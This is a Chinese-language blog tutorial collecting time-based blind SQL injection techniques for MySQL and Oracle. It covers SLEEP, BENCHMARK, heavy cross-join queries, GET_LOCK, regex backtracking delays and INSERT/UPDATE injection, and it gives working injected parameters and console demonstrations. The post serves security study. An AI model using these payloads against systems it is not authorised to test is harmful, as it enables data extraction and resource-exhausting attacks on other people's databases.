---
layout:	post
title:	"SQL注入-时间盲注整理"
date:	2020-04-16 11:26:08 +0800
tags:	SQL注入
color:	rgb(122,103,138)
cover:	'../assets/blog_pic/20200416_sqli_time_based/cover.png'
subtitle:	'Time Based'

---

* 目录
{:toc}


盲注，经我理解就是在服务端不可以直接返回数据的时候，摸索可以区别服务器执行结果的方法。







# 一些猜数据库时用到的函数

**length(a)**

返回a的长度

```
mysql> select length(database());
+--------------------+
| length(database()) |
+--------------------+
|                  4 |
+--------------------+
1 row in set (0.00 sec)
```

**left(a,b)**

从左侧截取a的前b位

```
select left(database(),1);
+--------------------+
| left(database(),1) |
+--------------------+
| t                  |
+--------------------+
1 row in set (0.00 sec)
```

**substr(a,b,c)**

截取a，从b开始，长度为c

```
mysql> select substr(database(),1,2);
+------------------------+
| substr(database(),1,2) |
+------------------------+
| te                     |
+------------------------+
1 row in set (0.00 sec)
```

**mid(a,b,c)**

和substr原理一样

```
mysql> select mid(database(),1,2);
+---------------------+
| mid(database(),1,2) |
+---------------------+
| te                  |
+---------------------+
1 row in set (0.00 sec)
```

**ascii(a)**

输出a的ascii码如果a是字符串，输出a字符串的第一个字符的ascii码

```
mysql> select ascii(substr(database(),2,3));
+-------------------------------+
| ascii(substr(database(),2,3)) |
+-------------------------------+
|                           101 |
+-------------------------------+
1 row in set (0.00 sec)
```

**ord(a)**

和ascii原理一样

```
mysql> select ord('a');
+----------+
| ord('a') |
+----------+
|       97 |
+----------+
1 row in set (0.00 sec)
```

**[if](https://sueisok.github.io/blog/sqli-trick/#ifexpr1expr2expr3)**

**[ifnull](https://sueisok.github.io/blog/sqli-trick/#ifnullexpr1expr2)**

**[elt](https://sueisok.github.io/blog/sqli-trick/#eltnstr1str2)**

**[field](https://sueisok.github.io/blog/sqli-trick/#fieldstrstr1str2)**

# SLEEP

sleep函数括号里的内容就是时间

```
mysql> select sleep(1);
+----------+
| sleep(1) |
+----------+
|        0 |
+----------+
1 row in set (1.00 sec)
```

**判断当前表行数**

```
mysql> select * from vorname where Vorname = sleep(1);
+---------+------------+-----+
| Vorname | Nachname   | Alt |
+---------+------------+-----+
| Lina    | Schneider  |  22 |
| Lara    | Zhang      |  20 |
| Patric  | Wang       |  23 |
| Tobias  | Alexandria |  22 |
+---------+------------+-----+
4 rows in set, 4 warnings (4.00 sec)
```

**判断数据库位数**

把sleep放到if里

```
mysql> select if(length(database())=4,sleep(2),null)a;
+------+
| a    |
+------+
|    0 |
+------+
1 row in set (2.00 sec)
```

**逐位猜解数据库名**

把if放到sleep里

```
mysql> select sleep(if(left(database(),1)='t',1,0))a;
+---+
| a |
+---+
| 0 |
+---+
1 row in set (1.00 sec)
```

还可以在sleep里做运算(payload来自sqlmap)，3-1=2秒

```
mysql> select sleep(3-if(left(database(),1)='t',1,0))a;
+---+
| a |
+---+
| 0 |
+---+
1 row in set (2.00 sec)
```

同理猜解数据表名，猜解数据等等









# BENCHMARK

benchmark是基准的意思，可以由用户指定执行一个sql语句或sql表达式的时间，通过执行大规模次数，获得比较稳定的sql执行时间

```
BENCHMARK(count,expr)
```

**count**是执行次数，**exr**是要执行的语句执行一次**sha(1)**时可能微不足道，执行10000000次**sha(1)**的时间就可以造成延时

```
mysql> select Alt from vorname where Vorname='Lina' and benchmark(100,sha(1));
Empty set (0.00 sec)

mysql> select Alt from vorname where Vorname='Lina' and benchmark(10000000,sha(1));
Empty set (2.72 sec)
```

可以结合**and短路运算规则**进行时间盲注



# Heavy Query

有的地方会叫**笛卡儿积**或者**多表联合查询**

先翻译一篇[SQL注入网站的文章](https://www.sqlinjection.net/heavy-query/)

> Using heavy queries instead of time delays

利用大量的查询代替时间延迟

（欸，感觉benchmark也是这个原理，利用大量执行一个sql语句的时间进行延迟

> For different reasons, it might happen that it is impossible to use time delay functions or procedures in order to achieve a [classic time delay injection](https://www.sqlinjection.net/time-based/). In these situations, the best option is to simulate it with a **heavy query that will take noticeable time to get executed by the database engine**. This article shows how it can be done and it presents an example for the main DBMS.

由于不同的原因，有时不会用延时函数或程序达到经典的延时注入。在这种情况下，最好的方法就是将他与大量查询结合，使得数据库引擎执行时消耗一个可见的时间。这篇文章会展示这是如何做到的，并举一个数据库的例子。

## Principle

> The injected query should not rely on user tables since in most cases the attacker will have no information about those yet. Queries presented in the following section rely on system tables. The execution time is essentially caused by the large number of lines returned.

大多数情况下，攻击者还没有掌握关于数据库或表的信息，所以查询语句不应该是依赖于数据表的，下面举例的查询依赖于系统数据表，执行时间事实上是大量的执行造成的。

> Keep in mind that the time to execute each query presented in this article **can tremendously vary depending on the number of rows** contained or returned by the table (or view). This number can be influenced by many factors like: the permissions of your user, the size of the database, the server performance, etc. You should begin with a query joining 2 tables and slowly increment until you can generate an acceptable delay.

需要了解的是，这篇文章举例的执行语句的时间，可能千差万别，取决于行的数量或者返回的表格。这个数可以被许多方面影响：用户的权限、数据库的大小、服务器的性能等等。你应该以两个表的联合语句开始，慢慢增加直到可接受的延时。![avatar](../../assets/blog_pic/20200416_sqli_time_based/Heavy-Query-Steps.png)



## MySQL or SQL Server

> Chances are low that you have to use the heavy query approach in MySQL or SQL Server since these DBMS make it relatively easy to inject classic code delays in a vulnerable field. However, it could still happen if, for example, **some function or characters are blacklisted**. Here is an example of heavy query that would work fine on SQL Server and on MySQL (version 5 or more).

你不得不使用大量的查询的情况还是很少的，因为MySQL或SQL Sever这样的数据库很容易被经典的延时注入。当然，如果一些函数或字符是黑名单过滤的，这个例子就可以很好得在MySQL和SQL Sever使用（版本需要大于5）

```sql
HEAVY MYSQL QUERY.
SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C
```

> In my test environment, the query above returns 594823321 and takes about 10 seconds to execute. Let’s now see how it could be used to identify if a vulnerability is present.

在我的实验环境中，以上查询返回结果为594823321，花费10秒，那么来看一下他是怎么确认漏洞是否存在的。

```sql
MALICIOUS PARAMETER.
1 AND 1>(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C) 

QUERY GENERATED.
SELECT * FROM products WHERE id=1 AND 1>(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)
```

> If the server response takes more time, a vulnerability is probably present. Otherwise we can conclude the field is safe.

如果服务器响应花费了很多时间，那么可能是存在漏洞的，否则你可以得出结论，此处是安全的。

## Oracle

> As explained in the article about [time-based attacks](https://www.sqlinjection.net/time-based/), in most cases you will need to use heavy queries in order to achieve this kind of SQL injection. Below is an example of query that takes a lot of time to be executed in this DBMS.

正如这篇文章阐释的，大多数情况下你需要使用大量查询来达到对Oracle数据库的注入。下面就是一个例子，在Oracle中用大量时间来执行查询。

```sql
HEAVY ORACLE QUERY.
SELECT count(*) FROM all_users A, all_users B, all_users C
```

> In my Oracle test environment the query above is executed in no time since **I have very few users**. When I grow the FROM clause to 7 tables it takes about 15 seconds. Let’s now see how it could be integrated in a vulnerable field.

在我的Oracle测试环境中，上述的查询如果只有很少的用户时，几乎不花费时间，当我讲FROM增加到7个表时大概花费15秒，那么来看一下在存在漏洞时他是怎么集成的。

```sql
MALICIOUS PARAMETER (TIME-BASED INJECTION).
1 AND 1<SELECT count(*) FROM all_users A, all_users B, all_users C

QUERY GENERATED.
SELECT * FROM products WHERE id=1 AND 1<SELECT count(*) FROM all_users A, all_users B, all_users C
```

> Here again, if the test slows significantly the server response, you can conclude a vulnerability is present in the field.

同理，如果测试有明显的响应延迟，你就可以得出结论，此处存在漏洞



## Additionnal Information

> As mentioned in the article about time-based attacks, the heavy query approach will have **noticeable impacts on CPU and server resources usage**. Whenever possible, try to inject a time delay that will not be CPU intensive and stick to standards techniques.

正如在延时注入攻击中提到的，大量的查询方式会很显著地占用CPU和服务器资源，如果可能，尝试延时注入时不要大量占用CPU或损坏基础框架。

> You must also be aware that **the injected query will most likely be executed only once**. The database optimizer will execute it, store its result and use the returned value(s) when testing the WHERE clause against each record. As you can guess, this is must faster than executing the query each time. It should be mentioned however that the query will not be executed if the optimizer detects that the WHERE clause is always false. To avoid any unexpected results **you should always try to generate a WHERE clause that will be verified for at least one record**.

你还应该知道的是，大多数注入语句只会执行一次，数据库优化器会执行他，将他的结果存储起来，当测试WHERE语句时，将结果取出，你可以想象到，这肯定比必须每次执行语句要快。也就是说如果优化器检测到WHERE语句总是错误，就不会执行，为了避免一些想不到的结果，当你确认需要返回结果时，你应该先尝试生成WHERE语句。



# GET_LOCK

```
GET_LOCK(str, timeout)
```

对关键字进行了get_lock,那么再开另一个session再次对关键进行get_lock，就会延时我们指定的时间

**SESSION A**上锁，注入时的第一步也是对字段加锁

```
mysql> select get_lock('111',10);
+--------------------+
| get_lock('111',10) |
+--------------------+
|                  1 |
+--------------------+
1 row in set (0.01 sec)
```

再打开一个终端**SESSION B**

```
mysql> select get_lock('111',5);
+-------------------+
| get_lock('111',5) |
+-------------------+
|                 0 |
+-------------------+
1 row in set (5.00 sec)
```

可结合**and短路运算规则**进行时间盲注

```
select * from vorname where Vorname='Lina' and 1=1 and  get_lock('111',2);
Empty set (2.00 sec)
```

**限制条件**

数据库连接必须是持久连接，这个我还没有实践过，参考参考文章，大概意思就是在数据库**mysql_connect()**到**mysql_close()**之间的生命周期才生效。



# 正则表达式

原理是通过大量的正则匹配实现延时，与**benchmark**和前面说的**heavy query**本质相似。

MySQL中有**like**、**rlike**、**regexp**正则可以用来匹配，其中**like**内容是通配符，不是正则；**rlike**和**regexp**内容可以正则。

**like**

like常用的通配符：%、_、escape

| 通配符 | 用法                  |
| ------ | --------------------- |
| %      | 匹配0个或任意多个字符 |
| _      | 匹配任意一个字符      |
| escape | 转义字符，可匹配%和_  |

举例

```
mysql> select * from vorname where Vorname like 'L%';
+---------+-----------+-----+
| Vorname | Nachname  | Alt |
+---------+-----------+-----+
| Lina    | Schneider |  22 |
| Lara    | Zhang     |  20 |
+---------+-----------+-----+
2 rows in set (0.00 sec)

mysql> select * from vorname where Vorname like '%L__a%';
+---------+-----------+-----+
| Vorname | Nachname  | Alt |
+---------+-----------+-----+
| Lina    | Schneider |  22 |
| Lara    | Zhang     |  20 |
+---------+-----------+-----+
2 rows in set (0.00 sec)

mysql> select * from vorname where Vorname not like '%L_r%';
+---------+------------+-----+
| Vorname | Nachname   | Alt |
+---------+------------+-----+
| Lina    | Schneider  |  22 |
| Patric  | Wang       |  23 |
| Tobias  | Alexandria |  22 |
+---------+------------+-----+
3 rows in set (0.01 sec)
```

escape '/' 是指用'/'说明在/后面的字符不是通配符，而是普通符



**rlike**、**regexp**

返回值为**1**或**0**，常用的通配符.、*、[]、^、$、{n}

| 通配符 | 用法                                                         |
| ------ | ------------------------------------------------------------ |
| .      | 匹配任意单个字符                                             |
| *      | 匹配0个或多个前一个得到的字符                                |
| []     | 匹配任意一个[]内的字符，[ab]*可匹配空、a、b、或任意由a和b组成的字符串 |
| ^      | 匹配开头，如^s匹配以s或者S开头的字符串                       |
| $      | 匹配结尾，如s$匹配以s结尾的字符串                            |
| {n}    | 匹配前一个字符反复n次                                        |

举例

```
mysql> select "1111111121111122222221234" rlike ".*2.*";
+-------------------------------------------+
| "1111111121111122222221234" rlike ".*2.*" |
+-------------------------------------------+
|                                         1 |
+-------------------------------------------+
1 row in set (0.00 sec)

mysql> select "1111111121111122222221234" regexp ".*12.*";
+--------------------------------------------+
| "1111111121111122222221234" regexp ".*12.*" |
+--------------------------------------------+
|                                          1 |
+--------------------------------------------+
1 row in set (0.00 sec)
```



**构造延时注入**

```
mysql> select * from vorname where Vorname='Lina' and IF(0,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';
Empty set (0.00 sec)

mysql> select * from vorname where Vorname='Lina' and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';
Empty set (6.20 sec)
```

😇**IF(0,x,y)**时，执行**y**，**IF(1,x,y)**时，执行**x**

😇**rpad(1,999999,'a')**的意思是在1后面补a，使得一共999999位

😇然后通过**rlike**判断字符串是不是形如**aaaaaab**，肯定没有后面这个**b**啦，返回值0



# insert 和 update 的盲注

```
insert into vorname values (16,'sueisok','0'| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));

update vorname set Alt = 21|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where Nachname='sueisok';
```

但这个会影响数据库数据



# Refer

[https://xz.aliyun.com/t/5505](shenmedoumeiyou)

[https://www.k0rz3n.com/2019/02/21/一篇文章带你深入理解 SQL 盲注/](dianjibunengtiaozhuan)

[https://blog.csdn.net/ouyn8/article/details/44674563](dianji)

[https://blog.csdn.net/yuanjiu4221/article/details/82661424](hahaha)